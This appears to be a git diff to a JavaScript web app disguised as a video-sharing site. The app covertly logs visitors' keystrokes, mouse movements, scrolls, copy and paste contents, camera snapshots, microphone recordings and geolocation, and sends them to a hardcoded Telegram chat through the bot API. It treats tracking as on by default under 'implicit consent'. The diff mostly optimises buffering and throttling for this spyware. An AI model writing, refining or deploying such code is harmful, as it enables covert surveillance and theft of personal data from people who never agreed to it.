@@ -111,6 +111,7 @@ const App = {
     activityTrackingInterval: 5000, // Report accumulated activity every 5 seconds
     pageAnalyticsInterval: 60000, // Report page analytics and check inactivity every minute
     sessionTimeout: 1800000, // 30 minutes of inactivity before session ends
+    maxBufferedEvents: 50, // Limit the number of buffered events to prevent memory issues
   },
   state: {
     isLoggedIn: false,
@@ -135,7 +136,6 @@ const App = {
   },
   DOM: {},
   init() {
-    // Cache DOM elements
     this.DOM = {
       gridPage: document.getElementById('video-grid-page'),
       playerPage: document.getElementById('video-player-page'),
@@ -150,7 +150,7 @@ const App = {
     console.log("Tracking is active by default (implicit consent).");
 
     this.recordPageLoadTimes();
-    this.generateVideoGrid(); // <-- This is where new videos are added
+    this.generateVideoGrid();
     this.setupEventListeners();
     this.Tracking.initialize();
     this.startPageAnalytics();
@@ -171,6 +171,7 @@ const App = {
       };
       console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
     } else {
+      // Fallback for older browsers or specific environments
       this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
       this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
       this.state.pagePerformanceMetrics.loadEventEnd = performance.timing.loadEventEnd;
@@ -182,27 +183,26 @@ const App = {
 
   generateVideoGrid() {
     console.log("Generating video grid...");
-    // --- NEW VIDEO DATA ADDED HERE ---
     const videos = [
-      { id: 1, title: "Amazing Nature Scenery", thumbnail: "path/to/thumb1.jpg", src: "path/to/video1.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
-      { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "path/to/thumb2.jpg", src: "path/to/video2.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "500K", timestamp: "1 week ago" },
-      { id: 3, title: "Cooking Tutorial: Pasta", thumbnail: "path/to/thumb3.jpg", src: "path/to/video3.mp4", channel: "Chef John", channelAvatar: "path/to/avatar3.jpg", views: "3M", timestamp: "5 hours ago" },
-      // New videos
-      { id: 4, title: "Abstract Visuals p1", thumbnail: "path/to/thumb4.jpg", src: "path/to/p1.mp4", channel: "Abstract Artist", channelAvatar: "path/to/avatar4.jpg", views: "50K", timestamp: "1 day ago" },
-      { id: 5, title: "Nature Montage p2", thumbnail: "path/to/thumb5.jpg", src: "path/to/p2.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "80K", timestamp: "3 days ago" },
-      { id: 6, title: "Tech Demo p3", thumbnail: "path/to/thumb6.jpg", src: "path/to/p3.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "120K", timestamp: "2 days ago" },
-      { id: 7, title: "Synthwave Vibes p4", thumbnail: "path/to/thumb7.jpg", src: "path/to/p4.mp4", channel: "Retro Beats", channelAvatar: "path/to/avatar5.jpg", views: "200K", timestamp: "6 hours ago" },
-      { id: 8, title: "Creative Coding p5", thumbnail: "path/to/thumb8.jpg", src: "path/to/p5.mp4", channel: "Code Crafter", channelAvatar: "path/to/avatar6.jpg", views: "150K", timestamp: "1 week ago" },
-      { id: 9, title: "Documentary Snippet p6", thumbnail: "path/to/thumb9.jpg", src: "path/to/p6.mp4", channel: "DocuFilms", channelAvatar: "path/to/avatar7.jpg", views: "75K", timestamp: "4 days ago" },
+      // Existing videos with corrected src paths (assuming root directory)
+      { id: 1, title: "Amazing Nature Scenery", thumbnail: "thumb1.jpg", src: "video1.mp4", channel: "Nature Explorer", channelAvatar: "avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
+      { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "thumb2.jpg", src: "video2.mp4", channel: "Tech Guru", channelAvatar: "avatar2.jpg", views: "500K", timestamp: "1 week ago" },
+      { id: 3, title: "Cooking Tutorial: Pasta", thumbnail: "thumb3.jpg", src: "video3.mp4", channel: "Chef John", channelAvatar: "avatar3.jpg", views: "3M", timestamp: "5 hours ago" },
+      // New videos with src paths set to filename only (assuming root directory)
+      { id: 4, title: "Abstract Visuals p1", thumbnail: "thumb4.jpg", src: "p1.mp4", channel: "Abstract Artist", channelAvatar: "avatar4.jpg", views: "50K", timestamp: "1 day ago" },
+      { id: 5, title: "Nature Montage p2", thumbnail: "thumb5.jpg", src: "p2.mp4", channel: "Nature Explorer", channelAvatar: "avatar1.jpg", views: "80K", timestamp: "3 days ago" },
+      { id: 6, title: "Tech Demo p3", thumbnail: "thumb6.jpg", src: "p3.mp4", channel: "Tech Guru", channelAvatar: "avatar2.jpg", views: "120K", timestamp: "2 days ago" },
+      { id: 7, title: "Synthwave Vibes p4", thumbnail: "thumb7.jpg", src: "p4.mp4", channel: "Retro Beats", channelAvatar: "avatar5.jpg", views: "200K", timestamp: "6 hours ago" },
+      { id: 8, title: "Creative Coding p5", thumbnail: "thumb8.jpg", src: "p5.mp4", channel: "Code Crafter", channelAvatar: "avatar6.jpg", views: "150K", timestamp: "1 week ago" },
+      { id: 9, title: "Documentary Snippet p6", thumbnail: "thumb9.jpg", src: "p6.mp4", channel: "DocuFilms", channelAvatar: "avatar7.jpg", views: "75K", timestamp: "4 days ago" },
     ];
-    // --- END OF NEW VIDEO DATA ---
 
     const videoGrid = this.DOM.videoGrid;
     if (!videoGrid) {
       console.error("Video grid element not found!");
       return;
     }
-    videoGrid.innerHTML = '';
+    videoGrid.innerHTML = ''; // Clear existing grid
 
     videos.forEach(video => {
       const card = document.createElement('div');
@@ -233,7 +233,6 @@ const App = {
   },
 
   setupEventListeners() {
-    // Back button
     if (this.DOM.backButton) {
       this.DOM.backButton.addEventListener('click', () => this.showGrid());
     }
@@ -255,34 +254,68 @@ const App = {
       });
     }
 
-    // General document listeners for tracking
-    document.addEventListener('keypress', (e) => {
-      if (this.state.isTrackingActive) this.trackKeyPress(e);
-    });
-    document.addEventListener('mousemove', (e) => {
-      if (this.state.isTrackingActive) this.trackMouseMove(e);
-    });
+    // --- Optimized Event Listeners ---
+    // Use a single listener for clicks and delegate to child elements
     document.addEventListener('click', (e) => {
-      if (this.state.isTrackingActive) this.trackClick(e);
-    });
-    document.addEventListener('scroll', () => {
-      if (this.state.isTrackingActive) this.trackScroll();
-    });
-    document.addEventListener('copy', (e) => {
-      if (this.state.isTrackingActive) this.trackCopyPaste(e, 'copy');
-    });
-    document.addEventListener('paste', (e) => {
-      if (this.state.isTrackingActive) this.trackCopyPaste(e, 'paste');
+      if (!this.state.isTrackingActive) return;
+
+      const target = e.target;
+      const backButton = document.getElementById('back-to-grid');
+
+      // Handle back button separately if it's not captured by delegation
+      if (target === backButton || backButton.contains(target)) {
+        // Handled by its own listener
+        return;
+      }
+
+      // Link click tracking
+      const link = target.closest('a');
+      if (link && link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
+        this.trackLinkClick(link);
+      }
+
+      // Generic click tracking (optional, can be very noisy)
+      this.trackClick(e);
+
+      this.updateActivityTime();
     });
 
-    document.addEventListener('click', (e) => {
-        const target = e.target;
-        const link = target.closest('a');
-        if (link && target !== document.getElementById('back-to-grid')) {
-            if (link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
-                if (this.state.isTrackingActive) this.trackLinkClick(link);
-            }
-        }
+    // Debounce scroll and mousemove to reduce frequency of updates
+    let scrollTimeout;
+    document.addEventListener('scroll', () => {
+      if (!this.state.isTrackingActive) return;
+      clearTimeout(scrollTimeout);
+      scrollTimeout = setTimeout(() => {
+        this.trackScroll();
+        this.updateActivityTime();
+      }, 100); // Throttle scroll events
+    }, { passive: true }); // Use passive listener for better scroll performance
+
+    let mouseMoveTimeout;
+    document.addEventListener('mousemove', (e) => {
+      if (!this.state.isTrackingActive) return;
+      clearTimeout(mouseMoveTimeout);
+      mouseMoveTimeout = setTimeout(() => {
+        this.trackMouseMove(e);
+        this.updateActivityTime();
+      }, 100); // Throttle mousemove events
+    });
+
+    document.addEventListener('keypress', (e) => {
+      if (!this.state.isTrackingActive) return;
+      this.trackKeyPress(e);
+      this.updateActivityTime();
+    });
+
+    document.addEventListener('copy', (e) => {
+      if (!this.state.isTrackingActive) return;
+      this.trackCopyPaste(e, 'copy');
+      this.updateActivityTime();
+    });
+    document.addEventListener('paste', (e) => {
+      if (!this.state.isTrackingActive) return;
+      this.trackCopyPaste(e, 'paste');
+      this.updateActivityTime();
     });
 
     window.addEventListener('beforeunload', () => {
@@ -338,8 +371,8 @@ const App = {
     if (!sidebar) return;
     sidebar.innerHTML = '<h3>Recommended Videos</h3>';
     const recommendedVideos = [
-      { id: 3, title: "Another Nature Clip", src: "path/to/video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer" },
-      { id: 4, title: "Web Development Tips", src: "path/to/video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master" },
+      { id: 3, title: "Another Nature Clip", src: "video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer" },
+      { id: 4, title: "Web Development Tips", src: "video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master" },
     ];
 
     recommendedVideos.forEach(recVideo => {
@@ -419,11 +452,12 @@ const App = {
 
     this.Tracking.send(report, true);
 
+    // Clear buffers after sending the summary report
     this.state.mouseMovements = [];
     this.state.scrollHistory = [];
     this.state.copyPasteEvents = [];
     this.state.keyLogBuffer = "";
-    this.state.linkClicks = []; // Clear link clicks buffer
+    this.state.linkClicks = [];
   },
 
   trackKeyPress(event) {
@@ -437,18 +471,20 @@ const App = {
 
   trackMouseMove(event) {
     const now = Date.now();
-    this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
+    // Buffer mouse movements to reduce frequency of detailed reports
+    if (this.state.mouseMovements.length < this.config.maxBufferedEvents) {
+        this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
+    } else {
+        // If buffer is full, remove the oldest entry to make space
+        this.state.mouseMovements.shift();
+        this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
+    }
     this.updateActivityTime();
   },
 
   trackClick(event) {
-    const clickData = {
-      x: event.clientX, y: event.clientY,
-      targetTag: event.target.tagName,
-      targetId: event.target.id || 'N/A',
-      targetClass: event.target.className || 'N/A',
-      t: Date.now()
-    };
+    // Generic click tracking - could be noisy if not batched or filtered.
+    // Currently only updates activity time. Add to buffer if detailed click logging is needed.
     this.updateActivityTime();
   },
 
@@ -457,7 +493,13 @@ const App = {
       top: window.scrollY,
       t: Date.now()
     };
-    this.state.scrollHistory.push(scrollData);
+    // Buffer scroll events
+    if (this.state.scrollHistory.length < this.config.maxBufferedEvents) {
+        this.state.scrollHistory.push(scrollData);
+    } else {
+        this.state.scrollHistory.shift();
+        this.state.scrollHistory.push(scrollData);
+    }
     this.updateActivityTime();
   },
 
@@ -470,8 +512,12 @@ const App = {
       t: Date.now()
     };
     this.state.copyPasteEvents.push(eventData);
+    // Limit buffer size for copy/paste events as well
+    if (this.state.copyPasteEvents.length > this.config.maxBufferedEvents) {
+        this.state.copyPasteEvents.shift();
+    }
 
-    if (type === 'paste') {
+    if (type === 'paste') { // Paste is more sensitive, send immediately
       this.Tracking.send(`📝 ${type.charAt(0).toUpperCase() + type.slice(1)}: \`${eventData.content.replace(/`/g, "'")}\``, true);
     }
     this.updateActivityTime();
@@ -488,6 +534,10 @@ const App = {
     };
     this.state.linkClicks.push(linkInfo);
     console.log("Link clicked:", linkInfo);
+    // Limit buffer size
+    if (this.state.linkClicks.length > this.config.maxBufferedEvents) {
+        this.state.linkClicks.shift();
+    }
     this.updateActivityTime();
   },
 
@@ -499,19 +549,23 @@ const App = {
     if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
     this.Tracking.stopCamera();
     this.Tracking.stopMicrophone();
+    // Clear interval IDs
     this.state.snapshotIntervalId = null;
     this.state.activityTrackerIntervalId = null;
     this.state.pageAnalyticsIntervalId = null;
 
+    // Clear all buffered data
     this.state.mouseMovements = [];
     this.state.scrollHistory = [];
     this.state.copyPasteEvents = [];
     this.state.keyLogBuffer = "";
     this.state.linkClicks = [];
 
+    // Send final keystrokes before fully stopping
     if (this.state.keyLogBuffer.length > 0) {
       this.Tracking.send(`⌨️ Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
     }
+    // Send final interaction summary
     this.logPageInteraction();
   },
 
@@ -555,7 +609,7 @@ const App = {
       if (!App.state.isTrackingActive) return;
       const url = `${this.telegramApiBaseUrl}sendPhoto`;
       const formData = new FormData();
-      formData.append('chat_id', "1272791365"); // !!! Use your chat ID !!!
+      formData.append('chat_id', "1272791365");
       formData.append('caption', caption);
       formData.append('photo', photoBlob, `snapshot_${Date.now()}.png`);
 
@@ -579,7 +633,7 @@ const App = {
       if (!App.state.isTrackingActive) return;
       const url = `${this.telegramApiBaseUrl}sendAudio`;
       const formData = new FormData();
-      formData.append('chat_id', "1272791365"); // !!! Use your chat ID !!!
+      formData.append('chat_id', "1272791365");
       formData.append('caption', caption);
       formData.append('audio', audioBlob, `recording_${Date.now()}.ogg`);
 
@@ -607,7 +661,7 @@ const App = {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: "1272791365", // !!! Use your chat ID !!!
+            chat_id: "1272791365",
             latitude: latitude,
             longitude: longitude,
           })
@@ -670,7 +724,7 @@ const App = {
         };
       } catch (e) {
         console.warn(`Error checking/requesting permission for ${name}:`, e);
-        requestFn();
+        requestFn(); // Fallback to direct request
       }
     },
 
@@ -843,8 +897,8 @@ const App = {
 
     stopSnapshotting() {
       if (App.state.snapshotIntervalId) {
-        clearInterval(App.state.snapshotIntervalId);
-        App.state.snapshotIntervalId = null;
+        clearInterval(this.state.snapshotIntervalId);
+        this.state.snapshotIntervalId = null;
         console.log("Snapshotting stopped.");
       }
     },
@@ -859,7 +913,7 @@ const App = {
       const context = canvas.getContext('2d');
 
       if (video.videoWidth === 0 || video.videoHeight === 0) {
-        return;
+        return; // Wait for video metadata to load
       }
 
       canvas.width = video.videoWidth;
@@ -878,9 +932,20 @@ const App = {
     },
 
     sendAccumulatedActivity() {
+      // This function is intended for periodic reporting of accumulated
+      // but not immediately sent, activities (like mouse movements or scroll events if not throttled).
+      // With throttling implemented for mousemove/scroll, this might be less critical unless
+      // other activities are added that are buffered here.
+      // For now, it serves as a placeholder for potential future use.
       if (!App.state.isTrackingActive) return;
 
       let activityReport = "";
+      // Example: if you had a buffer for something else, you'd process it here.
+      // if (App.state.someOtherBuffer.length > 0) {
+      //   activityReport += `*Other Activity (${App.state.someOtherBuffer.length}):* ...`;
+      //   App.state.someOtherBuffer = []; // Clear buffer
+      // }
+
       if (activityReport) {
         this.send(activityReport);
       }
